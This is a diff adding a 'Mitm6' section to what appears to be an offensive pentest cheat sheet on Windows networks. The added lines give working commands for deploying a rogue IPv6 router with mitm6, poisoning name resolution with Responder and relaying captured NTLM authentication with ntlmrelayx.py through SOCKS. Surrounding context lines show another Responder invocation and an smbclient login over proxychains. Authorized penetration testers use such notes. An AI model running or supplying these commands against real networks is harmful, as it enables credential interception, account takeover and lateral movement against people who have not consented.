@@ -40,6 +40,17 @@ responder -I eth0 -rdwv
     ```bash
     proxychains smbclient //192.168.48.230/Users -U contoso/normaluser1
     ```
+# Mitm6
+- We will deploy a rogue IPv6 router onto the network. A workstation with IPv6 enabled will prefer send the packaget to the IPv6 router.
+```bash
+mitm6 -i <interface>
+```
+- Mitm6 + Responder: You are essentially spoofing all (or specific) DNS requests, which will result in those systems landing in the hands of Responder
+  ```bash
+    python Responder.py -l tun0 -rdw
+
+    python ntlmrelayx.py -tf relayTargets.txt -socks -smb2support
+    ```
 # Enumeration
 - Enumerate all local accounts
 ```bat
